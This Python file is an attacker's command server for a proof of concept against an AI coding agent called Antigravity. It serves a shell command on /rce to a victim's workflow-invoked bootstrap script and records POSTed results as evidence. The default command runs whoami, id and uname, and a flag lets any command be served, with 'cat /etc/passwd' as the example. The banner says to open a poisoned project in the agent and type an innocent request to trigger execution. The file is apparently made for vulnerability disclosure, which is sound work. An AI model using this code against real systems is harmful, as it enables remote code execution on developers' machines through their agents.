#!/usr/bin/env python3
"""
Evidence Capture Server — Antigravity Execute Violation PoC
============================================================
Demonstrates the execute primitive: a workflow-invoked bootstrap script
fetches a command from this server and executes it on the victim machine.

Usage:
    python3 listener/server.py
    # or with a custom command:
    python3 listener/server.py --rce "cat /etc/passwd"

Then open poc-antigravity-v2/ in Antigravity and type:
    add error handling to pipeline.py
"""

import argparse
import http.server
import json
import os
import socketserver
from datetime import datetime

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8888
EVIDENCE_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "evidence"
)

# Default demo command served on GET /rce. This proves the execute primitive:
#  - writes a proof file to /tmp
#  - prints whoami, id, uname -a
DEFAULT_RCE_COMMAND = (
    'echo "EXECUTE_PROOF $(date -u +%Y-%m-%dT%H:%M:%SZ)" > '
    '/tmp/antigravity-execute-proof.txt; '
    'whoami; id; uname -a; '
    'echo "proof file:"; ls -la /tmp/antigravity-execute-proof.txt'
)

RCE_COMMAND = DEFAULT_RCE_COMMAND


class Handler(http.server.BaseHTTPRequestHandler):
    def _save_evidence(self, endpoint: str, raw: bytes, decoded: str):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(EVIDENCE_DIR, f"{ts}_{endpoint}.json")
        try:
            parsed = json.loads(decoded)
        except Exception:
            parsed = decoded
        with open(path, "w") as f:
            json.dump(
                {
                    "timestamp": ts,
                    "endpoint": endpoint,
                    "raw_size": len(raw),
                    "headers": dict(self.headers),
                    "data": parsed,
                },
                f,
                indent=2,
                default=str,
            )
        return path

    def do_GET(self):
        if self.path.rstrip("/") == "/rce":
            # Serve the attacker's command to the victim's bootstrap.sh.
            body = RCE_COMMAND.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print(f"\n[+] GET /rce — served command: {RCE_COMMAND!r}\n")
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"listener active")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)
        endpoint = self.path.lstrip("/") or "root"

        try:
            decoded = raw.decode("utf-8", errors="replace")
        except Exception:
            decoded = str(raw)

        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print("\n" + "=" * 70)
        print(f"  EVIDENCE — /{endpoint}   [{ts}]")
        print(f"  size: {length}  src: {self.client_address[0]}:{self.client_address[1]}")
        print("=" * 70)
        try:
            pretty = json.dumps(json.loads(decoded), indent=2)
            print(pretty[:4000])
            if len(pretty) > 4000:
                print(f"\n... ({len(pretty) - 4000} bytes truncated)")
        except Exception:
            print(decoded[:4000])
        print("=" * 70 + "\n")

        saved = self._save_evidence(endpoint, raw, decoded)
        print(f"  saved: {saved}\n")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        return  # suppress default access log


def main():
    global RCE_COMMAND
    ap = argparse.ArgumentParser()
    ap.add_argument(
        "--rce",
        default=DEFAULT_RCE_COMMAND,
        help="shell snippet served on GET /rce (attacker command)",
    )
    args = ap.parse_args()
    RCE_COMMAND = args.rce

    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    with socketserver.TCPServer((LISTEN_HOST, LISTEN_PORT), Handler) as s:
        print(
            f"""
+{'='*62}+
|  ANTIGRAVITY EXECUTE VIOLATION — EVIDENCE CAPTURE SERVER       |
+{'='*62}+
|  Listening:    http://{LISTEN_HOST}:{LISTEN_PORT}
|  Evidence dir: {EVIDENCE_DIR}
|  RCE command:  {RCE_COMMAND[:55]}{'...' if len(RCE_COMMAND) > 55 else ''}
|
|  NEXT STEPS:
|  1. Open poc-antigravity-v2/ in Antigravity (Agent / Cascade panel)
|  2. Type: add error handling to pipeline.py
|  3. Watch this terminal for GET /rce and POST /rce-result
|  4. Verify proof: cat /tmp/antigravity-execute-proof.txt
+{'='*62}+
"""
        )
        try:
            s.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down listener.")


if __name__ == "__main__":
    main()
